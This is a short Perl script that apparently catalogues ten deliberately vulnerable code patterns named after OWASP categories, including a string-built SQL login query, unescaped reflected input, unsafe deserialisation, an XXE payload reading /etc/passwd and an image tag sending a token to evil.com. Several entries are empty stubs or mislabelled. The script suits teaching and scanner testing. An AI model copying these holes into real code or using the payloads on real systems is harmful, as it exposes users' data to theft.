#!/usr/bin/perl

use CGI qw(:standard);
use DBI;

# 1. SQL Injection
sub login {
    my ($username, $password) = @_;
    my $dbh = DBI->connect("dbi:mysql:database=mydb", "username", "password");
    my $query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
    my $sth = $dbh->prepare($query);
    $sth->execute();
    # Fetch and process results
    $dbh->disconnect();
}

# 2. Cross-Site Scripting (XSS)
my $userInput = param('user_input');
print header();
print "<html><body>$userInput</body></html>";

# 3. Insecure Deserialization
my $serializedData = get_data_from_user();
my $user = thaw($serializedData);

# 4. Broken Authentication
sub reset_password {
    my ($newPassword) = @_;
    # No authentication or authorization checks
    # Anyone can reset the password
}

# 5. Sensitive Data Exposure
sub get_user_profile {
    my ($userId) = @_;
    # Fetch user profile without proper access control
}

# 6. XML External Entity (XXE) Injection
my $xmlData = <<END_XML;
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
END_XML

# 7. Security Misconfiguration
# Example not relevant in Perl script

# 8. Insecure Dependencies
# Using outdated or vulnerable Perl modules
use Vulnerable::Module;

# 9. Cross-Site Request Forgery (CSRF)
my $csrfToken = "malicious_token";
my $imgTag = qq(<img src="https://evil.com/steal?token=$csrfToken" />);

# 10. Unvalidated Redirects and Forwards
sub redirect_to_external_site {
    my ($url) = @_;
    # No validation of the URL
    print redirect($url);
}

